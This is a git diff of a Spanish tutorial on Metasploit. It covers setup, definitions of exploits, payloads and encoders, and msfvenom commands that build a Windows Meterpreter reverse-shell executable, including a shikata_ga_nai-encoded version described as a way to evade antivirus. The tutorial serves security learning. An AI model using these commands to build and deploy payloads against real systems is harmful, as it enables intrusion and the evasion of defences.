@@ -1,4 +1,6 @@
 
+`EN CONSTRUCCIÓN !!!`
+
 # Metasploit
 
 
@@ -15,6 +17,7 @@
 * `sudo rpm -i metasploit-framework-XXX.x86_64.rpm`
 * `msfdb init`, crear el schema de la BBDD para MS.
 * `msfconsole`, iniciar MS y comprobamos la BBDD.
+
 ```
 david@camaleon> msfconsole
 
@@ -51,11 +54,87 @@ msf > db_status
 msf > exit
 ```
 
+> Resumen: Para iniciar MSF
+> * `sudo systemctl start postgresql`
+> * `msfdb init`
+> * `msfconsole`
+
 ---
 
-# 2. TEORÍA: Comandos de Metasploit
+# 2. TEORÍA: Definiciones
 
-* Iniciamos:
-    * `sudo systemctl start postgresql`
-    * `msfconsole`
-* Comando `help`, ver los comandos de Metasploit
+* `msf> help`, ver los comandos de Metasploit
+
+## 2.1 Los exploits
+
+Un exploit es un fallo el cual se puede aprovechar para diferentes fines: como el control del sistema, robo de información, etc.
+
+* `show exploits`, nos muestra todos los exploits.
+
+> La base de datos de exploits se actualiza contínuamente con las nuevas vulnerabilidades que se van detectando.
+
+## 2.2 Payloads
+
+Los payloads son "bloques de código" que se cargan y ejecutan gracias a las vulnerabilidades. Con ellas podemos conseguir:
+* la obtención de una Shell y tomar el control del sistema afectado o
+* provocar un desbordamiento o saturación del sistema.
+
+* `show payloads`, nos muestra todos los payloads.
+
+Hay diferentes tipos de Payloads, según el sistema operativo o los servicios instalados:
+* **Meterpreter** o Meta-Interpreter
+    * Payload avanzado y multifacético que opera mediante inyección dll.
+    * Reside completamente en la memoria del host remoto y no deja rastros en el disco duro, por lo que es muy difícil
+    de detectar con técnicas forenses convencionales.
+* **PassiveX**
+    * Payload que ayudar a eludir los firewalls de salida restrictivos. Lo hace mediante el uso de un control ActiveX para crear una instancia oculta de Internet Explorer. Usando el nuevo control ActiveX, se comunica con el atacante a través de
+    solicitudes y respuestas HTTP.
+* **IPv6**
+    * Diseñados para funcionar en redes que use el protocolo IPv6.
+
+## 2.3 Encoders
+
+Encargado de cifrar exploits, payload, etc.
+
+* `search encoders`
+
+---
+
+# 3. TEORÍA: Generando Payloads
+
+Con la herramienta `msfvenom` podemos generar nuestros propios Payloads para un objetivo específico. Además también los podemos exportar a varios formatos ejecutables y cifrarlo con cualquiera de los "encoder".
+
+
+## 3.1 Ejemplo: shell inversa
+
+```
+msf > msfvenom
+[*] exec: msfvenom
+
+Usage: /opt/metasploit-framework/bin/../embedded/framework/msfvenom [options] <var=val>
+Example: /opt/metasploit-framework/bin/../embedded/framework/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
+...
+
+msf > msfvenom -p windows/meterpreter/reverse_tcp
+               LHOST=127.0.0.1
+               LPORT=4444
+               -f exe > shell.exe
+```
+
+| Parámetro | Descripción | Ejemplo |
+| --------- | ----------- | ------- |
+| -p        | Payload     | Para sistemas Windows |
+| LHOST     | Nuestra IP local | 127.0.0.1 |
+| LPORT     | Nuestro puerto local | 4444 |
+| -f        | Formato de salida | Ejecutable shell.exe 32bits |
+
+Cuando se ejecute este Payload tendremos una shell de Meterpreter reversa. Es decir, él se conectaría a nosotros y esta iría por el protocolo TCP.
+
+## 3.2 Ejemplo: esconderse del antivirus
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -e x86/shikata_ga_nai > shell.exe
+```
+
+
+* Este ejemplo es similar al anterior pero nuestro Payload esta cifrado por el encoder "shikata_ga_nai" para protegerse, por ejemplo, de los antivirus.
